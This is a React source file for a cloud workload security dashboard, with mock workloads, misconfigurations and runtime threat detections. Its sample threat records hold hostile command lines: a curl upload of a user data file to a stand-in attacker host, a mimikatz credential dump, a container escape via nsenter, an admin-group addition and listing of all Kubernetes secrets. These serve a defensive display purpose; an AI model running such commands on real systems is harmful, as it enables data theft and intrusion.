'use client'

import { useState, useMemo } from 'react'
import { useQuery } from '@tanstack/react-query'
import { apiFetch } from '@/lib/api'
import {
  Cloud, Search, Filter, Plus, X, ChevronRight, Shield,
  AlertTriangle, Calendar, Clock, CheckCircle2, Activity,
  Database, Server, Cpu, Globe, RefreshCw, ChevronDown,
  Terminal, Eye, Zap, Lock, AlertCircle, Settings,
  BarChart2, TrendingUp, FileText, XCircle, Package,
  Layers, Box, Hash, ExternalLink,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────

type CloudProvider = 'aws' | 'azure' | 'gcp'
type WorkloadType = 'vm' | 'container' | 'lambda' | 'rds' | 'aks_pod'
type ProtectionStatus = 'protected' | 'unprotected' | 'partial'
type ThreatType = 'crypto_mining' | 'container_escape' | 'privilege_escalation' | 'suspicious_process' | 'data_exfil'
type Severity = 'critical' | 'high' | 'medium' | 'low'
type MisconfigStatus = 'open' | 'fixed' | 'suppressed'

interface RuntimeEvent {
  timestamp: string
  type: string
  process: string
  description: string
  severity: Severity
}

interface Vulnerability {
  cve: string
  severity: Severity
  description: string
  cvss: number
}

interface ConfigIssue {
  issue: string
  severity: Severity
  description: string
}

interface Workload {
  id: string
  workload_name: string
  type: WorkloadType
  provider: CloudProvider
  region: string
  protection_status: ProtectionStatus
  agent_version: string | null
  last_seen: string
  threats_count: number
  tags: string[]
  runtime_events: RuntimeEvent[]
  vulnerabilities: Vulnerability[]
  config_issues: ConfigIssue[]
  account_id: string
  instance_id: string
}

interface RuntimeThreat {
  id: string
  timestamp: string
  workload_id: string
  workload_name: string
  provider: CloudProvider
  threat_type: ThreatType
  severity: Severity
  process: string
  cmdline: string
  auto_blocked: boolean
  process_tree: string[]
  network_connections: { src: string; dst: string; port: number; proto: string }[]
  recommended_response: string[]
}

interface Misconfiguration {
  id: string
  workload_id: string
  workload_name: string
  provider: CloudProvider
  issue_type: string
  severity: Severity
  description: string
  remediation: string
  status: MisconfigStatus
  quick_fixable: boolean
  region?: string
}

interface CISScore {
  category: string
  score: number
  passed: number
  failed: number
  total: number
}

// ─── Mock Data ────────────────────────────────────────────────────────────────

const MOCK_WORKLOADS: Workload[] = [
  { id: 'wl-001', workload_name: 'prod-web-server-01', type: 'vm', provider: 'aws', region: 'us-east-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:30:00Z', threats_count: 0, tags: ['prod', 'web', 'tier-1'], runtime_events: [], vulnerabilities: [{ cve: 'CVE-2024-1234', severity: 'high', description: 'OpenSSL buffer overflow', cvss: 8.1 }], config_issues: [], account_id: '123456789', instance_id: 'i-0abc123def456' },
  { id: 'wl-002', workload_name: 'mining-suspicious-ec2', type: 'vm', provider: 'aws', region: 'ap-northeast-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:25:00Z', threats_count: 3, tags: ['dev'], runtime_events: [{ timestamp: '2026-03-18T09:00:00Z', type: 'crypto_mining', process: 'xmrig', description: 'Crypto mining process detected', severity: 'critical' }], vulnerabilities: [], config_issues: [], account_id: '123456789', instance_id: 'i-0def456abc789' },
  { id: 'wl-003', workload_name: 'k8s-api-pod-7d9f', type: 'aks_pod', provider: 'azure', region: 'eastus', protection_status: 'protected', agent_version: '7.11.3', last_seen: '2026-03-18T10:28:00Z', threats_count: 1, tags: ['k8s', 'api', 'prod'], runtime_events: [{ timestamp: '2026-03-18T08:30:00Z', type: 'container_escape', process: 'bash', description: 'Container escape attempt via privileged exec', severity: 'critical' }], vulnerabilities: [{ cve: 'CVE-2024-5678', severity: 'critical', description: 'Container runtime vulnerability', cvss: 9.8 }], config_issues: [{ issue: 'Privileged Container', severity: 'high', description: 'Pod running with privileged flag' }], account_id: 'sub-azure-001', instance_id: 'pod-7d9f4a2b' },
  { id: 'wl-004', workload_name: 'prod-db-postgres-rds', type: 'rds', provider: 'aws', region: 'us-east-1', protection_status: 'partial', agent_version: null, last_seen: '2026-03-18T10:00:00Z', threats_count: 0, tags: ['prod', 'database', 'critical'], runtime_events: [], vulnerabilities: [], config_issues: [{ issue: 'Public Accessibility', severity: 'high', description: 'RDS instance publicly accessible' }], account_id: '123456789', instance_id: 'arn:aws:rds:db-001' },
  { id: 'wl-005', workload_name: 'data-processor-lambda', type: 'lambda', provider: 'aws', region: 'eu-west-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:15:00Z', threats_count: 0, tags: ['serverless', 'data'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: '123456789', instance_id: 'arn:aws:lambda:func-001' },
  { id: 'wl-006', workload_name: 'nginx-container-prod', type: 'container', provider: 'gcp', region: 'us-central1', protection_status: 'protected', agent_version: '7.12.0', last_seen: '2026-03-18T10:29:00Z', threats_count: 0, tags: ['gcp', 'prod', 'web'], runtime_events: [], vulnerabilities: [{ cve: 'CVE-2023-9999', severity: 'medium', description: 'nginx path traversal', cvss: 6.5 }], config_issues: [], account_id: 'gcp-proj-001', instance_id: 'container-abc' },
  { id: 'wl-007', workload_name: 'dev-vm-unprotected', type: 'vm', provider: 'aws', region: 'us-west-2', protection_status: 'unprotected', agent_version: null, last_seen: '2026-03-17T14:00:00Z', threats_count: 0, tags: ['dev', 'test'], runtime_events: [], vulnerabilities: [], config_issues: [{ issue: 'No Agent Installed', severity: 'high', description: 'Workload has no security agent' }], account_id: '123456789', instance_id: 'i-0unprotected' },
  { id: 'wl-008', workload_name: 'batch-job-gke-pod', type: 'aks_pod', provider: 'gcp', region: 'europe-west1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:20:00Z', threats_count: 0, tags: ['gcp', 'batch'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: 'gcp-proj-001', instance_id: 'pod-gke-batch' },
  { id: 'wl-009', workload_name: 'azure-vm-dc01', type: 'vm', provider: 'azure', region: 'westeurope', protection_status: 'protected', agent_version: '7.11.3', last_seen: '2026-03-18T10:31:00Z', threats_count: 2, tags: ['azure', 'ad', 'critical'], runtime_events: [{ timestamp: '2026-03-18T07:00:00Z', type: 'privilege_escalation', process: 'cmd.exe', description: 'Privilege escalation attempt', severity: 'high' }], vulnerabilities: [{ cve: 'CVE-2024-9999', severity: 'high', description: 'Windows privilege escalation', cvss: 7.8 }], config_issues: [], account_id: 'sub-azure-001', instance_id: 'vm-dc01' },
  { id: 'wl-010', workload_name: 'analytics-bigquery-fn', type: 'lambda', provider: 'gcp', region: 'us-central1', protection_status: 'partial', agent_version: null, last_seen: '2026-03-18T09:50:00Z', threats_count: 0, tags: ['gcp', 'analytics'], runtime_events: [], vulnerabilities: [], config_issues: [{ issue: 'Overly Permissive IAM', severity: 'medium', description: 'Function has editor role binding' }], account_id: 'gcp-proj-002', instance_id: 'fn-analytics' },
  { id: 'wl-011', workload_name: 'cache-redis-cluster', type: 'rds', provider: 'azure', region: 'japaneast', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:33:00Z', threats_count: 0, tags: ['cache', 'prod'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: 'sub-azure-002', instance_id: 'redis-cluster-01' },
  { id: 'wl-012', workload_name: 'ml-training-spot-vm', type: 'vm', provider: 'gcp', region: 'us-west1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:10:00Z', threats_count: 0, tags: ['ml', 'training', 'gpu'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: 'gcp-proj-001', instance_id: 'vm-ml-001' },
  { id: 'wl-013', workload_name: 'api-gateway-lambda', type: 'lambda', provider: 'aws', region: 'ap-southeast-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:35:00Z', threats_count: 0, tags: ['api', 'prod', 'serverless'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: '987654321', instance_id: 'fn-api-gw' },
  { id: 'wl-014', workload_name: 'worker-container-suspicious', type: 'container', provider: 'azure', region: 'eastus2', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:27:00Z', threats_count: 4, tags: ['worker', 'data'], runtime_events: [{ timestamp: '2026-03-18T10:00:00Z', type: 'data_exfil', process: 'curl', description: 'Large data transfer to external IP detected', severity: 'high' }], vulnerabilities: [], config_issues: [], account_id: 'sub-azure-001', instance_id: 'container-worker-sus' },
  { id: 'wl-015', workload_name: 'vpc-flow-analyzer-lambda', type: 'lambda', provider: 'aws', region: 'us-east-2', protection_status: 'unprotected', agent_version: null, last_seen: '2026-03-16T12:00:00Z', threats_count: 0, tags: ['network', 'analytics'], runtime_events: [], vulnerabilities: [], config_issues: [{ issue: 'No Monitoring', severity: 'medium', description: 'No security monitoring configured' }], account_id: '123456789', instance_id: 'fn-vpc-flow' },
  { id: 'wl-016', workload_name: 'gke-microservice-auth', type: 'aks_pod', provider: 'gcp', region: 'asia-northeast1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:34:00Z', threats_count: 0, tags: ['gcp', 'auth', 'prod'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: 'gcp-proj-003', instance_id: 'pod-auth-svc' },
  { id: 'wl-017', workload_name: 'mysql-primary-rds', type: 'rds', provider: 'aws', region: 'ap-northeast-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:32:00Z', threats_count: 0, tags: ['db', 'prod', 'critical'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: '123456789', instance_id: 'arn:aws:rds:mysql-001' },
  { id: 'wl-018', workload_name: 'monitoring-agent-vm', type: 'vm', provider: 'azure', region: 'centralus', protection_status: 'partial', agent_version: '7.10.0', last_seen: '2026-03-18T08:00:00Z', threats_count: 0, tags: ['monitoring', 'infra'], runtime_events: [], vulnerabilities: [], config_issues: [{ issue: 'Outdated Agent', severity: 'medium', description: 'Agent version is outdated' }], account_id: 'sub-azure-002', instance_id: 'vm-monitor-01' },
  { id: 'wl-019', workload_name: 'frontend-cdn-lambda', type: 'lambda', provider: 'aws', region: 'us-east-1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:36:00Z', threats_count: 0, tags: ['cdn', 'web', 'prod'], runtime_events: [], vulnerabilities: [], config_issues: [], account_id: '123456789', instance_id: 'fn-cdn' },
  { id: 'wl-020', workload_name: 'spambot-infected-vm', type: 'vm', provider: 'gcp', region: 'southamerica-east1', protection_status: 'protected', agent_version: '7.12.1', last_seen: '2026-03-18T10:22:00Z', threats_count: 5, tags: ['dev', 'deprecated'], runtime_events: [{ timestamp: '2026-03-18T06:00:00Z', type: 'suspicious_process', process: 'sendmail', description: 'Abnormal outbound email volume detected', severity: 'high' }], vulnerabilities: [{ cve: 'CVE-2023-1111', severity: 'critical', description: 'Remote code execution', cvss: 9.8 }], config_issues: [], account_id: 'gcp-proj-001', instance_id: 'vm-spam-deprecated' },
]

const MOCK_THREATS: RuntimeThreat[] = [
  {
    id: 'thr-001', timestamp: '2026-03-18T09:00:00Z', workload_id: 'wl-002', workload_name: 'mining-suspicious-ec2', provider: 'aws',
    threat_type: 'crypto_mining', severity: 'critical', process: 'xmrig', cmdline: './xmrig --pool pool.minexmr.com:4444 --user wallet123',
    auto_blocked: true,
    process_tree: ['systemd', 'bash', 'curl (download)', 'xmrig'],
    network_connections: [{ src: '10.0.1.45:52341', dst: 'pool.minexmr.com:4444', port: 4444, proto: 'tcp' }],
    recommended_response: ['Terminate xmrig process', 'Isolate instance', 'Scan for persistence mechanisms', 'Rotate IAM credentials'],
  },
  {
    id: 'thr-002', timestamp: '2026-03-18T08:30:00Z', workload_id: 'wl-003', workload_name: 'k8s-api-pod-7d9f', provider: 'azure',
    threat_type: 'container_escape', severity: 'critical', process: 'bash', cmdline: 'nsenter --target 1 --mount --uts --ipc --net --pid',
    auto_blocked: false,
    process_tree: ['kubelet', 'containerd-shim', 'bash', 'nsenter'],
    network_connections: [{ src: '172.17.0.5:39201', dst: '185.220.101.45:443', port: 443, proto: 'tcp' }],
    recommended_response: ['Kill pod immediately', 'Check node integrity', 'Audit RBAC permissions', 'Review pod security policies'],
  },
  {
    id: 'thr-003', timestamp: '2026-03-18T10:00:00Z', workload_id: 'wl-014', workload_name: 'worker-container-suspicious', provider: 'azure',
    threat_type: 'data_exfil', severity: 'high', process: 'curl', cmdline: 'curl -T /data/users.csv http://evil-collector.com/upload',
    auto_blocked: false,
    process_tree: ['bash', 'find (data collection)', 'tar (archive)', 'curl (upload)'],
    network_connections: [{ src: '10.20.1.10:41000', dst: 'evil-collector.com:80', port: 80, proto: 'tcp' }],
    recommended_response: ['Block outbound connection', 'Isolate container', 'Preserve evidence', 'Notify data protection officer'],
  },
  {
    id: 'thr-004', timestamp: '2026-03-18T07:00:00Z', workload_id: 'wl-009', workload_name: 'azure-vm-dc01', provider: 'azure',
    threat_type: 'privilege_escalation', severity: 'high', process: 'cmd.exe', cmdline: 'whoami /priv & net localgroup administrators user /add',
    auto_blocked: true,
    process_tree: ['svchost.exe', 'cmd.exe', 'net.exe'],
    network_connections: [],
    recommended_response: ['Revert group membership changes', 'Review audit logs', 'Check for persistence', 'Reset compromised account'],
  },
  {
    id: 'thr-005', timestamp: '2026-03-18T06:00:00Z', workload_id: 'wl-020', workload_name: 'spambot-infected-vm', provider: 'gcp',
    threat_type: 'suspicious_process', severity: 'high', process: 'sendmail', cmdline: 'sendmail -v -q0 -f spam@bulk-sender.net',
    auto_blocked: false,
    process_tree: ['cron', 'python3 (orchestrator)', 'sendmail'],
    network_connections: [
      { src: '10.128.0.25:50123', dst: '74.125.21.27:25', port: 25, proto: 'tcp' },
      { src: '10.128.0.25:50124', dst: '52.84.17.100:25', port: 25, proto: 'tcp' },
    ],
    recommended_response: ['Block SMTP egress on instance', 'Quarantine VM', 'Check for botnet C2', 'Review cron jobs'],
  },
  {
    id: 'thr-006', timestamp: '2026-03-18T05:30:00Z', workload_id: 'wl-002', workload_name: 'mining-suspicious-ec2', provider: 'aws',
    threat_type: 'crypto_mining', severity: 'critical', process: 'kworker', cmdline: './kworker/u:0 -c stratum+tcp://xmr.pool.minergate.com:45700',
    auto_blocked: true,
    process_tree: ['init', 'kworker (disguised)'],
    network_connections: [{ src: '10.0.1.45:49102', dst: 'xmr.pool.minergate.com:45700', port: 45700, proto: 'tcp' }],
    recommended_response: ['Isolate instance', 'Full disk forensics', 'Check for rootkit'],
  },
  {
    id: 'thr-007', timestamp: '2026-03-18T04:00:00Z', workload_id: 'wl-003', workload_name: 'k8s-api-pod-7d9f', provider: 'azure',
    threat_type: 'privilege_escalation', severity: 'high', process: 'kubectl', cmdline: 'kubectl get secrets --all-namespaces',
    auto_blocked: false,
    process_tree: ['bash', 'kubectl'],
    network_connections: [{ src: '172.17.0.5:44100', dst: '10.96.0.1:443', port: 443, proto: 'tcp' }],
    recommended_response: ['Restrict kubectl access', 'Rotate secrets', 'Audit RBAC'],
  },
  {
    id: 'thr-008', timestamp: '2026-03-18T03:00:00Z', workload_id: 'wl-009', workload_name: 'azure-vm-dc01', provider: 'azure',
    threat_type: 'suspicious_process', severity: 'medium', process: 'mimikatz.exe', cmdline: 'mimikatz.exe privilege::debug sekurlsa::logonpasswords',
    auto_blocked: true,
    process_tree: ['explorer.exe', 'mimikatz.exe'],
    network_connections: [],
    recommended_response: ['Terminate process', 'Change all passwords', 'Enable Credential Guard', 'Full incident response'],
  },
  {
    id: 'thr-009', timestamp: '2026-03-17T22:00:00Z', workload_id: 'wl-020', workload_name: 'spambot-infected-vm', provider: 'gcp',
    threat_type: 'suspicious_process', severity: 'medium', process: 'python3', cmdline: 'python3 /tmp/.hidden/harvester.py',
    auto_blocked: false,
    process_tree: ['systemd', 'python3'],
    network_connections: [{ src: '10.128.0.25:38000', dst: '45.33.32.156:8080', port: 8080, proto: 'tcp' }],
    recommended_response: ['Remove hidden script', 'Inspect /tmp for malware', 'Isolate VM'],
  },
  {
    id: 'thr-010', timestamp: '2026-03-17T20:00:00Z', workload_id: 'wl-014', workload_name: 'worker-container-suspicious', provider: 'azure',
    threat_type: 'data_exfil', severity: 'high', process: 'rclone', cmdline: 'rclone copy /mnt/data remote:bucket --transfers 16',
    auto_blocked: false,
    process_tree: ['bash', 'rclone'],
    network_connections: [{ src: '10.20.1.10:55100', dst: 'storage.googleapis.com:443', port: 443, proto: 'tcp' }],
    recommended_response: ['Block storage access', 'Audit data transferred', 'Preserve logs'],
  },
]

const MOCK_MISCONFIGS: Misconfiguration[] = [
  { id: 'mc-001', workload_id: 'wl-004', workload_name: 'prod-db-postgres-rds', provider: 'aws', issue_type: 'Public Database Exposure', severity: 'critical', description: 'RDS instance has publicly accessible flag enabled. Database should never be directly exposed to the internet.', remediation: 'Disable publicly_accessible flag in RDS instance settings. Use VPC and security groups to restrict access.', status: 'open', quick_fixable: true },
  { id: 'mc-002', workload_id: 'wl-003', workload_name: 'k8s-api-pod-7d9f', provider: 'azure', issue_type: 'Privileged Container', severity: 'high', description: 'Pod spec has privileged: true which grants all Linux capabilities and host device access.', remediation: 'Remove privileged flag. Use specific capabilities with securityContext.capabilities.add only what is needed.', status: 'open', quick_fixable: false },
  { id: 'mc-003', workload_id: 'wl-010', workload_name: 'analytics-bigquery-fn', provider: 'gcp', issue_type: 'Overly Permissive IAM', severity: 'high', description: 'Cloud Function service account has Editor role binding at project level.', remediation: 'Apply principle of least privilege. Create a custom role with only the permissions the function requires.', status: 'open', quick_fixable: false },
  { id: 'mc-004', workload_id: 'wl-007', workload_name: 'dev-vm-unprotected', provider: 'aws', issue_type: 'No Security Agent', severity: 'high', description: 'Instance running without EDR agent coverage. No runtime threat detection or response capability.', remediation: 'Install Kizashi agent. Enroll instance in auto-deploy group.', status: 'open', quick_fixable: true },
  { id: 'mc-005', workload_id: 'wl-018', workload_name: 'monitoring-agent-vm', provider: 'azure', issue_type: 'Outdated Agent Version', severity: 'medium', description: 'Agent version 7.10.0 is below the recommended minimum of 7.11.0. Missing critical security patches.', remediation: 'Update agent via auto-update policy or manual upgrade via admin portal.', status: 'open', quick_fixable: true },
  { id: 'mc-006', workload_id: 'wl-015', workload_name: 'vpc-flow-analyzer-lambda', provider: 'aws', issue_type: 'No Security Monitoring', severity: 'medium', description: 'Lambda function lacks CloudWatch logging and no security monitoring configured.', remediation: 'Enable CloudWatch logging. Attach security monitoring via Lambda layer.', status: 'open', quick_fixable: true },
  { id: 'mc-007', workload_id: 'wl-001', workload_name: 'prod-web-server-01', provider: 'aws', issue_type: 'Unencrypted EBS Volume', severity: 'medium', description: 'Root EBS volume is not encrypted at rest.', remediation: 'Create encrypted snapshot and restore to new encrypted volume.', status: 'fixed', quick_fixable: false },
  { id: 'mc-008', workload_id: 'wl-006', workload_name: 'nginx-container-prod', provider: 'gcp', issue_type: 'Container Running as Root', severity: 'medium', description: 'Container process running as root user (UID 0).', remediation: 'Add runAsNonRoot: true and runAsUser with non-zero UID in pod security context.', status: 'open', quick_fixable: false },
  { id: 'mc-009', workload_id: 'wl-001', workload_name: 'prod-web-server-01', provider: 'aws', issue_type: 'Open Security Group', severity: 'low', description: 'Security group allows SSH (port 22) from 0.0.0.0/0.', remediation: 'Restrict SSH access to management IP ranges. Use AWS Systems Manager Session Manager instead.', status: 'suppressed', quick_fixable: true },
  { id: 'mc-010', workload_id: 'wl-009', workload_name: 'azure-vm-dc01', provider: 'azure', issue_type: 'Missing Disk Encryption', severity: 'medium', description: 'VM data disks not encrypted with Azure Disk Encryption.', remediation: 'Enable Azure Disk Encryption for all attached data disks.', status: 'open', quick_fixable: true },
  { id: 'mc-011', workload_id: 'wl-012', workload_name: 'ml-training-spot-vm', provider: 'gcp', issue_type: 'No Shielded VM', severity: 'low', description: 'VM not configured with Shielded VM features for secure boot.', remediation: 'Recreate VM with Shielded VM configuration enabled.', status: 'open', quick_fixable: false },
  { id: 'mc-012', workload_id: 'wl-008', workload_name: 'batch-job-gke-pod', provider: 'gcp', issue_type: 'No Resource Limits', severity: 'low', description: 'Pod has no CPU or memory limits which could lead to resource exhaustion.', remediation: 'Add resource limits to pod spec: resources.limits.cpu and resources.limits.memory.', status: 'open', quick_fixable: false },
  { id: 'mc-013', workload_id: 'wl-013', workload_name: 'api-gateway-lambda', provider: 'aws', issue_type: 'No VPC Configuration', severity: 'low', description: 'Lambda function not deployed in VPC, reducing network isolation.', remediation: 'Configure Lambda VPC settings with private subnets and security groups.', status: 'suppressed', quick_fixable: false },
  { id: 'mc-014', workload_id: 'wl-017', workload_name: 'mysql-primary-rds', provider: 'aws', issue_type: 'No Automated Backups', severity: 'medium', description: 'Automated backup retention period set to 0 (disabled).', remediation: 'Enable automated backups with at least 7 days retention.', status: 'fixed', quick_fixable: true },
  { id: 'mc-015', workload_id: 'wl-011', workload_name: 'cache-redis-cluster', provider: 'azure', issue_type: 'AUTH Disabled', severity: 'high', description: 'Redis cluster does not require authentication.', remediation: 'Enable Redis AUTH and set a strong password via Azure Cache settings.', status: 'open', quick_fixable: true },
]

const CIS_SCORES: Record<CloudProvider, CISScore[]> = {
  aws: [
    { category: 'Identity and Access Management', score: 78, passed: 14, failed: 4, total: 18 },
    { category: 'Storage', score: 85, passed: 11, failed: 2, total: 13 },
    { category: 'Logging', score: 92, passed: 11, failed: 1, total: 12 },
    { category: 'Monitoring', score: 67, passed: 10, failed: 5, total: 15 },
    { category: 'Networking', score: 88, passed: 14, failed: 2, total: 16 },
  ],
  azure: [
    { category: 'Identity and Access Management', score: 82, passed: 16, failed: 3, total: 19 },
    { category: 'Security Center', score: 75, passed: 9, failed: 3, total: 12 },
    { category: 'Storage Accounts', score: 90, passed: 9, failed: 1, total: 10 },
    { category: 'Database Services', score: 70, passed: 7, failed: 3, total: 10 },
    { category: 'Networking', score: 85, passed: 17, failed: 3, total: 20 },
  ],
  gcp: [
    { category: 'Identity and Access Management', score: 72, passed: 13, failed: 5, total: 18 },
    { category: 'Logging and Monitoring', score: 88, passed: 14, failed: 2, total: 16 },
    { category: 'Virtual Machines', score: 65, passed: 11, failed: 6, total: 17 },
    { category: 'Storage', score: 91, passed: 10, failed: 1, total: 11 },
    { category: 'Kubernetes Engine', score: 78, passed: 14, failed: 4, total: 18 },
  ],
}

// ─── Helper Functions ─────────────────────────────────────────────────────────

const TYPE_ICONS: Record<WorkloadType, React.ReactNode> = {
  vm: <Server className="w-4 h-4" />,
  container: <Box className="w-4 h-4" />,
  lambda: <Zap className="w-4 h-4" />,
  rds: <Database className="w-4 h-4" />,
  aks_pod: <Layers className="w-4 h-4" />,
}

const TYPE_LABELS: Record<WorkloadType, string> = {
  vm: 'VM',
  container: 'Container',
  lambda: 'Serverless',
  rds: 'Database',
  aks_pod: 'K8s Pod',
}

function getProtectionBadge(status: ProtectionStatus) {
  const map = {
    protected: 'bg-green-900/40 text-green-400 border-green-700/40',
    unprotected: 'bg-red-900/40 text-red-400 border-red-700/40',
    partial: 'bg-yellow-900/40 text-yellow-400 border-yellow-700/40',
  }
  const labels = { protected: '保護済み', unprotected: '未保護', partial: '部分的' }
  return { cls: map[status], label: labels[status] }
}

function getSeverityBadge(severity: Severity) {
  const map: Record<Severity, string> = {
    critical: 'bg-red-900/40 text-red-400 border border-red-700/40',
    high: 'bg-orange-900/40 text-orange-400 border border-orange-700/40',
    medium: 'bg-yellow-900/40 text-yellow-400 border border-yellow-700/40',
    low: 'bg-blue-900/40 text-blue-400 border border-blue-700/40',
  }
  const labels: Record<Severity, string> = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low' }
  return { cls: map[severity], label: labels[severity] }
}

function getThreatTypeBadge(type: ThreatType) {
  const map: Record<ThreatType, string> = {
    crypto_mining: 'bg-yellow-900/40 text-yellow-400',
    container_escape: 'bg-red-900/40 text-red-400',
    privilege_escalation: 'bg-orange-900/40 text-orange-400',
    suspicious_process: 'bg-purple-900/40 text-purple-400',
    data_exfil: 'bg-rose-900/40 text-rose-400',
  }
  const labels: Record<ThreatType, string> = {
    crypto_mining: 'クリプトマイニング',
    container_escape: 'コンテナ脱出',
    privilege_escalation: '権限昇格',
    suspicious_process: '不審プロセス',
    data_exfil: 'データ流出',
  }
  return { cls: map[type], label: labels[type] }
}

const PROVIDER_COLORS: Record<CloudProvider, string> = {
  aws: 'text-orange-400',
  azure: 'text-blue-400',
  gcp: 'text-green-400',
}

// ─── Sub-components ───────────────────────────────────────────────────────────

function WorkloadDetailModal({ workload, onClose }: { workload: Workload; onClose: () => void }) {
  const [tab, setTab] = useState<'events' | 'vulns' | 'config'>('events')
  const prot = getProtectionBadge(workload.protection_status)

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 overflow-y-auto py-4">
      <div className="w-full max-w-3xl mx-4 bg-falcon-surface border border-falcon-border rounded-xl shadow-2xl">
        <div className="flex items-start justify-between p-5 border-b border-falcon-border">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className={`text-xs px-2 py-0.5 rounded-sm border ${prot.cls}`}>{prot.label}</span>
              <span className={`text-xs font-medium ${PROVIDER_COLORS[workload.provider]}`}>{workload.provider.toUpperCase()}</span>
            </div>
            <h2 className="text-lg font-bold text-white">{workload.workload_name}</h2>
            <p className="text-xs text-falcon-muted mt-0.5">{workload.region} · {workload.instance_id}</p>
          </div>
          <button onClick={onClose} className="text-falcon-muted hover:text-white"><X className="w-5 h-5" /></button>
        </div>
        <div className="flex border-b border-falcon-border">
          {[
            { id: 'events', label: `ランタイムイベント (${workload.runtime_events.length})` },
            { id: 'vulns', label: `脆弱性 (${workload.vulnerabilities.length})` },
            { id: 'config', label: `設定問題 (${workload.config_issues.length})` },
          ].map(t => (
            <button key={t.id} onClick={() => setTab(t.id as typeof tab)}
              className={`px-4 py-2.5 text-sm border-b-2 transition-colors ${tab === t.id ? 'border-falcon-red text-white' : 'border-transparent text-falcon-muted hover:text-white'}`}>
              {t.label}
            </button>
          ))}
        </div>
        <div className="p-4 max-h-[50vh] overflow-y-auto">
          {tab === 'events' && (
            workload.runtime_events.length === 0
              ? <p className="text-sm text-falcon-muted text-center py-6">ランタイムイベントなし</p>
              : workload.runtime_events.map((e, i) => {
                const sev = getSeverityBadge(e.severity as Severity)
                return (
                  <div key={i} className="flex gap-3 mb-3 bg-[#070d19] border border-falcon-border rounded-lg p-3">
                    <AlertTriangle className="w-4 h-4 text-falcon-red mt-0.5 shrink-0" />
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-0.5">
                        <span className="text-sm font-medium text-white">{e.type}</span>
                        <span className={`text-xs px-1.5 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
                      </div>
                      <p className="text-xs text-falcon-muted">{e.description}</p>
                      <p className="text-xs text-falcon-subtle mt-1">{e.timestamp} · {e.process}</p>
                    </div>
                  </div>
                )
              })
          )}
          {tab === 'vulns' && (
            workload.vulnerabilities.length === 0
              ? <p className="text-sm text-falcon-muted text-center py-6">脆弱性なし</p>
              : workload.vulnerabilities.map((v, i) => {
                const sev = getSeverityBadge(v.severity)
                return (
                  <div key={i} className="flex gap-3 mb-3 bg-[#070d19] border border-falcon-border rounded-lg p-3">
                    <Shield className="w-4 h-4 text-orange-400 mt-0.5 shrink-0" />
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-0.5">
                        <span className="text-sm font-mono text-white">{v.cve}</span>
                        <span className={`text-xs px-1.5 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
                        <span className="text-xs text-falcon-muted">CVSS {v.cvss}</span>
                      </div>
                      <p className="text-xs text-falcon-muted">{v.description}</p>
                    </div>
                  </div>
                )
              })
          )}
          {tab === 'config' && (
            workload.config_issues.length === 0
              ? <p className="text-sm text-falcon-muted text-center py-6">設定問題なし</p>
              : workload.config_issues.map((c, i) => {
                const sev = getSeverityBadge(c.severity as Severity)
                return (
                  <div key={i} className="flex gap-3 mb-3 bg-[#070d19] border border-falcon-border rounded-lg p-3">
                    <Settings className="w-4 h-4 text-yellow-400 mt-0.5 shrink-0" />
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-0.5">
                        <span className="text-sm font-medium text-white">{c.issue}</span>
                        <span className={`text-xs px-1.5 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
                      </div>
                      <p className="text-xs text-falcon-muted">{c.description}</p>
                    </div>
                  </div>
                )
              })
          )}
        </div>
      </div>
    </div>
  )
}

function ThreatDetailModal({ threat, onClose }: { threat: RuntimeThreat; onClose: () => void }) {
  const tt = getThreatTypeBadge(threat.threat_type)
  const sev = getSeverityBadge(threat.severity)

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 overflow-y-auto py-4">
      <div className="w-full max-w-2xl mx-4 bg-falcon-surface border border-falcon-border rounded-xl shadow-2xl">
        <div className="flex items-start justify-between p-5 border-b border-falcon-border">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className={`text-xs px-2 py-0.5 rounded-sm ${tt.cls}`}>{tt.label}</span>
              <span className={`text-xs px-2 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
              {threat.auto_blocked && <span className="text-xs px-2 py-0.5 rounded-sm bg-green-900/40 text-green-400">自動ブロック</span>}
            </div>
            <h2 className="text-lg font-bold text-white">{threat.workload_name}</h2>
            <p className="text-xs text-falcon-muted mt-0.5">{threat.timestamp}</p>
          </div>
          <button onClick={onClose} className="text-falcon-muted hover:text-white"><X className="w-5 h-5" /></button>
        </div>
        <div className="p-5 space-y-4 max-h-[70vh] overflow-y-auto">
          <div className="bg-[#070d19] border border-falcon-border rounded-lg p-3">
            <h3 className="text-xs font-semibold text-falcon-muted mb-2">コマンドライン</h3>
            <code className="text-xs font-mono text-green-400 break-all">{threat.cmdline}</code>
          </div>
          <div className="bg-[#070d19] border border-falcon-border rounded-lg p-3">
            <h3 className="text-xs font-semibold text-falcon-muted mb-2">プロセスツリー</h3>
